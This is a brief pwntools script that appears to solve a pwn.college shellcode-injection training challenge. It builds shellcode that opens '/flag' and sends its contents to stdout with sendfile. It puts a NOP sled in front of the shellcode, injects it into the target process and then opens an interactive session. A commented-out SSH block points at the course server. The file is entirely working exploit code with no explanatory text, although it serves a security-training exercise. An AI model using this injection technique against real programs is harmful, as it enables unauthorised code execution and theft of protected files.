from pwn import *

e = ELF('./babyshell_level8_teaching1')
libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
# s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../key',port=22)
# p = s.run('/babyshell_level8_teaching1')
p = e.process()

context.arch = e.arch
context.os = e.os

pay = shellcraft.open('/flag',0)
pay += shellcraft.sendfile(1,3,0,0xff)
print(pay)
pay = asm(pay)
p.send(b'\x90'*0xF00 + pay)

p.interactive()